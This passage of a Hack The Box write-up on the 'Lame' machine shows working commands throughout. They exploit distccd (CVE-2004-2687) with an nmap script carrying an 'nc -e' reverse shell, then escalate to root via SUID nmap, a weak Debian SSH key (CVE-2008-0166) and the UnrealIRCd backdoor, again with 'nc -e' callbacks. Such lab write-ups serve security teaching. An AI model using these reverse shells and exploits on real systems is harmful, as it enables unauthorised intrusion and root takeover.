Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>4.37 seconds
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="daemon-shell">Daemon Shell</h3>

<p>Based on the <code class="language-plaintext highlighter-rouge">nmap</code> script results we can see the host is vulnerable to <code class="language-plaintext highlighter-rouge">CVE-2004-2687</code> and output of <code class="language-plaintext highlighter-rouge">id</code> command inside the script is displays as user <code class="language-plaintext highlighter-rouge">daemon</code>.</p>

<p>We can use the argument parameter of the script to change the command from <code class="language-plaintext highlighter-rouge">id</code> to <code class="language-plaintext highlighter-rouge">reverse shell payload</code>:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ nmap <span class="nt">-p3632</span> 10.10.10.3 <span class="nt">--script</span> distcc-exec <span class="nt">--script-args</span><span class="o">=</span><span class="s2">"distcc-exec.cmd='nc -e /bin/bash 10.10.14.17 4444'"</span>
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-14 01:42 IST
Nmap scan report <span class="k">for </span>10.10.10.3
Host is up <span class="o">(</span>0.24s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE
3632/tcp open  distccd

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>31.62 seconds
</pre></td></tr></tbody></table></code></pre></div></div>
<p>As soon as the script execution completes, we get a call back on <code class="language-plaintext highlighter-rouge">nc</code> listener:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ nc <span class="nt">-lvnp</span> 4444
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:59434.
<span class="nb">whoami
</span>daemon
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Since we are running as under privileged user <code class="language-plaintext highlighter-rouge">daemon</code>, lets try different privilege escalation methods to gain root.</p>

<h2 id="root-shell-1">Root Shell</h2>

<h3 id="privesc1--nmap-suid">PrivEsc1 : Nmap SUID</h3>

<p>We can use <code class="language-plaintext highlighter-rouge">find</code> command to search for SUID binaries on the machine:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ nc <span class="nt">-lvnp</span> 4444
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:59434.
<span class="nb">whoami
</span>daemon
python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
daemon@lame:/tmp<span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s 2&gt;/dev/null
find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s 2&gt;/dev/null
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/sbin/mount.nfs
/lib/dhcp3-client/call-dhclient-script
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/netkit-rsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/netkit-rlogin
/usr/bin/arping
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap
/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/telnetlogin
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Out of all the SUID binaries, most intresting is <code class="language-plaintext highlighter-rouge">nmap</code>. We can use <a href="https://gtfobins.github.io/gtfobins/nmap/"><strong>gtfo</strong></a> guidelines for nmap to escalate privileges and grab our flags.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>daemon@lame:/tmp<span class="nv">$ </span>nmap <span class="nt">--interactive</span>
nmap <span class="nt">--interactive</span>

Starting Nmap V. 4.53 <span class="o">(</span> http://insecure.org <span class="o">)</span>
Welcome to Interactive Mode <span class="nt">--</span> press h &lt;enter&gt; <span class="k">for </span><span class="nb">help
</span>nmap&gt; <span class="o">!</span>sh
<span class="o">!</span>sh
sh-3.2# <span class="nb">whoami
whoami
</span>root
sh-3.2# <span class="nb">cat</span> /root/root.txt
<span class="nb">cat</span> /root/root.txt
92caac3be140ef<span class="k">******************</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="privesc2--weak-ssh-key">PrivEsc2 : Weak SSH Key</h3>

<p>Credits to <a href="https://twitter.com/0xdf"><strong>0xdf</strong></a> for pointing out this privilege escalation vector.</p>

<p>We can see user Daemon can read contents of <code class="language-plaintext highlighter-rouge">root</code> directory except for <code class="language-plaintext highlighter-rouge">root.txt</code>. Inside <code class="language-plaintext highlighter-rouge">.ssh</code> directory we are able to read public keys file <code class="language-plaintext highlighter-rouge">authorized_keys</code>:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>daemon@lame:/root/.ssh<span class="nv">$ </span><span class="nb">cat </span>authorized_keys
<span class="nb">cat </span>authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w<span class="o">==</span> msfadmin@metasploitable
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Looking at the user as <code class="language-plaintext highlighter-rouge">msfadmin@metasploitable</code> from <code class="language-plaintext highlighter-rouge">authorized_keys</code> it might be possible that this could be vulnerable to <code class="language-plaintext highlighter-rouge">CVE-2008-0166</code> where the random number generator in OpenSSL broke for a period of time causing some SSH keys, to be brute forcible from the public key.</p>

<p>We will use <a href="https://github.com/g0tmi1k/debian-ssh"><strong>g0tmi1kâ€™s</strong></a> repo to exploit this vulnerability.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame/debian-ssh/common_keys  |master ?:1 âœ—|
â†’ <span class="nb">ls
</span>debian_ssh_dsa_1024_x86.tar.bz2  debian_ssh_rsa_2048_x86.tar.bz2
cfx:  ~/Documents/htb/lame/debian-ssh/common_keys  |master ?:1 âœ—|
â†’ <span class="nb">tar </span>jxf debian_ssh_rsa_2048_x86.tar.bz2
</pre></td></tr></tbody></table></code></pre></div></div>
<p>After extracting <code class="language-plaintext highlighter-rouge">debian_ssh_rsa_2048_x86.tar.bz2</code>, we can use <code class="language-plaintext highlighter-rouge">grep</code> and <code class="language-plaintext highlighter-rouge">lr</code> for recursive search to just display the filename with the public key.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame/debian-ssh/common_keys/rsa/2048  |master ?:1 âœ—|
â†’ <span class="nb">grep</span> <span class="nt">-lr</span> AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w<span class="o">==</span> <span class="k">*</span>.pub
57c3115d77c56390332dc5c49978627a-5429.pub
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now we can use the matching private key, but first we need to <code class="language-plaintext highlighter-rouge">chmod 600</code> the key to own it and then SSH to box as <code class="language-plaintext highlighter-rouge">root</code>:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame/debian-ssh/common_keys/rsa/2048  |master ?:1 âœ—|
â†’ ssh <span class="nt">-i</span> 57c3115d77c56390332dc5c49978627a-5429 root@10.10.10.3
Last login: Sun Sep 13 11:22:15 2020 from 10.10.14.17
Linux lame 2.6.24-16-server <span class="c">#1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</span>

The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@lame:~# <span class="nb">cat </span>root.txt
92caac3be140ef<span class="k">******************</span>
root@lame:~# <span class="nb">exit
logout</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="privesc3--unrealircd-backdoored">PrivEsc3 : UnrealIRCd Backdoored</h3>

<p>Looking the listening services on the machine, we can see port <code class="language-plaintext highlighter-rouge">6697</code> which could be IRC over SSL.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre>daemon@lame:/<span class="nv">$ </span>netstat <span class="nt">-tnlp</span>
netstat <span class="nt">-tnlp</span>
<span class="o">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="o">)</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:512             0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:513             0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:2049            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:514             0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:8009            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:6697            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:3306            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:1099            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:6667            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:139             0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:5900            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:43181           0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:59949           0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:39182           0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:111             0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:6000            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:8787            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:8180            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:1524            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:21              0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:41909           0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 10.10.10.3:53           0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 127.0.0.1:53            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:23              0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:5432            0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:25              0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 127.0.0.1:953           0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp6       0      0 :::2121                 :::<span class="k">*</span>                    LISTEN      -
tcp6       0      0 :::3632                 :::<span class="k">*</span>                    LISTEN      -
tcp6       0      0 :::53                   :::<span class="k">*</span>                    LISTEN      -
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -
tcp6       0      0 :::5432                 :::<span class="k">*</span>                    LISTEN      -
tcp6       0      0 ::1:953                 :::<span class="k">*</span>                    LISTEN      -
</pre></td></tr></tbody></table></code></pre></div></div>

<p>While looking at the processes running on the machine, we can see <code class="language-plaintext highlighter-rouge">UnrealIRCd</code> is running as root</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>daemon@lame:/<span class="nv">$ </span>ps auxww | <span class="nb">grep</span> <span class="nt">-i</span> unreal
ps auxww | <span class="nb">grep</span> <span class="nt">-i</span> unreal
root      5197  0.0  0.4   8540  2368 ?        S    08:08   0:01 /usr/bin/unrealircd
daemon    6936  0.0  0.1   1784   540 pts/1    RN+  16:24   0:00 <span class="nb">grep</span> <span class="nt">-i</span> unreal
</pre></td></tr></tbody></table></code></pre></div></div>

<p>With reference to <a href="https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html"><strong>this article</strong></a> we can exploit this <code class="language-plaintext highlighter-rouge">UnrealIRCd</code> to create a backdoor and get a shell as root.</p>

<h4 id="checking-port-6697">Checking port 6697:</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>daemon@lame:/<span class="nv">$ </span>nc 127.0.0.1 6697
nc 127.0.0.1 6697
:irc.Metasploitable.LAN NOTICE AUTH :<span class="k">***</span> Looking up your hostname...
:irc.Metasploitable.LAN NOTICE AUTH :<span class="k">***</span> Couldn<span class="s1">'t resolve your hostname; using your IP address instead
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>We get output as Metasploitable which indicates we are on right track. In order to easily use the backdoor, we could use the known method of connect-back shell.</p>

<h4 id="connect-back-shell">Connect-back shell:</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>daemon@lame:/<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"AB; nc -e /bin/sh 10.10.14.17 1337"</span> | nc 127.0.0.1 6697
<span class="nb">echo</span> <span class="s2">"AB; nc -e /bin/sh 10.10.14.17 1337"</span> | nc 127.0.0.1 6697
:irc.Metasploitable.LAN NOTICE AUTH :<span class="k">***</span> Looking up your hostname...
:irc.Metasploitable.LAN NOTICE AUTH :<span class="k">***</span> Couldn<span class="s1">'t resolve your hostname; using your IP address instead
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Getting a call back on our <code class="language-plaintext highlighter-rouge">nc</code> listener as user root:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/lame
â†’ nc <span class="nt">-lvnp</span> 1337
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:58268.
<span class="nb">whoami
</span>root
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="nb">exit</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And we pwned the Box !</p>

<p>Thanks for reading, Feedback is appreciated !</p>
:ET